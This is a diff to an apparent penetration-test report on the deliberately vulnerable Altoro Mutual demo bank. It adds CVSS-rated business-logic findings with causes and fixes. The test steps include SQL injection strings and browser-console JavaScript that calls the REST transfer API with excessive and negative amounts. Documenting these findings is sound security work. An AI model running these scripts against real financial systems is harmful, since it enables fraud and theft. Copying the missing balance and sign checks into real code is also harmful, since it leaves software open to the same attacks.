@@ -82,12 +82,32 @@ header-includes: |
 ## Business logic flaw (excessive money transfer)
 
 - **Test CVSS severity**: High
-- **Test CVSS score:** 8.6
-- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
+- **Test CVSS score:** 7.1
+- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
 - **Description of the type of the vulnerability:** a defect in the business logic (lack of input validation)
 - **Description of the vulnerability :** an attacker can transfer an amount (AM) of money from their account (A) to their other account (B) even if the amount (AM) exceeds the balance in account (A).
 - **Impact:** severe impact; successful exploitation gives the attacker the ability to put an unlimited amount of money on one of their accounts and put a negative amount of money on another one of their accounts.
 - **Recommendations:** make sure the user can not transfer an amount of money that is larger than his account's balance
+
+## Business logic flaw (excessive money transfer in REST API)
+
+- **Test CVSS severity**: High
+- **Test CVSS score:** 7.1
+- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
+- **Description of the type of the vulnerability:** a defect in the business logic (lack of REST API request body validation)
+- **Description of the vulnerability :** an attacker can transfer an amount (AM) of money from their account (A) to their other account (B) even if the amount (AM) exceeds the balance in account (A).
+- **Impact:** severe impact; successful exploitation gives the attacker the ability to put an unlimited amount of money on one of their accounts and put a negative amount of money on another one of their accounts.
+- **Recommendations:** make sure the user can not transfer an amount of money that is larger than his account's balance through the REST API
+
+## Business logic flaw (negative money transfer in REST API)
+
+- **Test CVSS severity**: High
+- **Test CVSS score:** 7.1
+- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
+- **Description of the type of the vulnerability:** a defect in the business logic (lack of REST API request body validation)
+- **Description of the vulnerability :** an attacker can transfer a negative amount of money from their account to another account
+- **Impact:** severe impact; successful exploitation gives the attacker the ability to transfer a negative amount of money from an account to another leading to an decrease of money in the receiving account and a increase of money in the sending account
+- **Recommendations:** make sure the user can not transfer a negative amount of money through the REST API
 
 # Finding scenarios
 
@@ -119,7 +139,7 @@ SELECT COUNT(*) FROM PEOPLE WHERE USER_ID = 'asd' or 1=1 -- AND PASSWORD='anythi
 ### Test steps
 
 - Open /altoromutual
-- Run the following script in your browser's dev tools' console (F12 > console):
+- Run the following script in your browser's dev tools' console while on the website (F12 > console):
 
   ```javascript
   username = "asd' or 1=1 --";
@@ -168,7 +188,7 @@ SELECT COUNT(*) FROM PEOPLE WHERE USER_ID = 'asd' or 1=1 -- AND PASSWORD='anythi
 ### Test steps
 
 - Go to `/altoromutual/bank/transaction.jsp`
-- Run the following javascript in the browser console (F12 > console):
+- Run the following javascript code in the browser console while on the website (F12 > console):
 
   ```javascript
   Form1.onsubmit = undefined;
@@ -290,3 +310,93 @@ In `index.jsp`, content is served from the `static/` directory using user provid
 - View the available balance in account (B) and notice how it increases:
 
 ![Increased balance](image-20.png)
+
+### Cause
+
+`OperationsUtil.doServletTransfer` does not check the available balance
+
+## Business logic flaw (excessive money transfer in REST API)
+
+### Test steps
+
+- Enter the following script while on the website (F12 > console), and observe how excessive funds (funds that are greater than 800005's balance) are sent to 800004 account:
+
+  ```javascript
+  username = 'jdoe';
+  password = 'demo1234';
+  res = await (
+    await fetch('/altoromutual/api/login', {
+      headers: { 'Content-Type': 'application/json' },
+      method: 'POST',
+      body: JSON.stringify({
+        username,
+        password
+      })
+    })
+  ).json();
+
+  auth = res.Authorization;
+
+  res = await (
+    await fetch('/altoromutual/api/transfer', {
+      headers: { 'Content-Type': 'application/json', Authorization: auth },
+      method: 'POST',
+      body: JSON.stringify({
+        toAccount: '800004',
+        fromAccount: '800005',
+        transferAmount: '1000000000000'
+      })
+    })
+  ).json();
+  ```
+
+![Sending excessive funds via REST API](image-21.png)
+
+- Confirm that the funds are sent as in the previous vulnerability
+
+### Cause
+
+`OperationsUtil.doApiTransfer` does not do business logic checks before calling `DBUtil.transferFunds`
+
+## Business logic flaw (negative money transfer in REST API)
+
+### Test steps
+
+- Run the following script in the browser's console while on the website (F12 > console), and observe the negative funds get sent successfully:
+
+  ```javascript
+  username = 'jdoe';
+  password = 'demo1234';
+  res = await (
+    await fetch('/altoromutual/api/login', {
+      headers: { 'Content-Type': 'application/json' },
+      method: 'POST',
+      body: JSON.stringify({
+        username,
+        password
+      })
+    })
+  ).json();
+
+  auth = res.Authorization;
+
+  res = await (
+    await fetch('/altoromutual/api/transfer', {
+      headers: { 'Content-Type': 'application/json', Authorization: auth },
+      method: 'POST',
+      body: JSON.stringify({
+        toAccount: '800005',
+        fromAccount: '800004',
+        transferAmount: '-2000000'
+      })
+    })
+  ).json();
+  ```
+
+![Transferring negative funds](image-22.png)
+
+- Confirm the new balances as in the previous vulnerability
+
+### Cause
+
+`OperationsUtil.doApiTransfer` does not do business logic checks before calling `DBUtil.transferFunds`
